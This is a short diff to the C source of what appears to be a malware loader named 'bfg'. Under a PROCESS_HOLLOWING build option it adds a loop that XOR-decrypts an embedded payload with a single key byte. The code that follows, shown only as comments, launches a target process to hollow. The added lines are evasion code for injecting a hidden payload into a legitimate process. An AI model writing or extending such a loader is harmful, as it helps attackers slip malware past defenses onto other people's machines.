@@ -143,6 +143,13 @@ int main (int argc, char **argv)
 	}
 	
 	#ifdef PROCESS_HOLLOWING
+	// Decrypt payload
+	// (payloadSize, keyByte and payload specified in defs.h by make_bfg)
+	for(long i=0; i < payloadSize; i++)
+	{
+		payload[i] = payload[i] ^ keyByte;
+	}	
+	
 	// Instanciate target process
 	// Target process specified in first bfg argument argv[1]	
 	// Command line arguments for payload in second bfg argument argv[2]
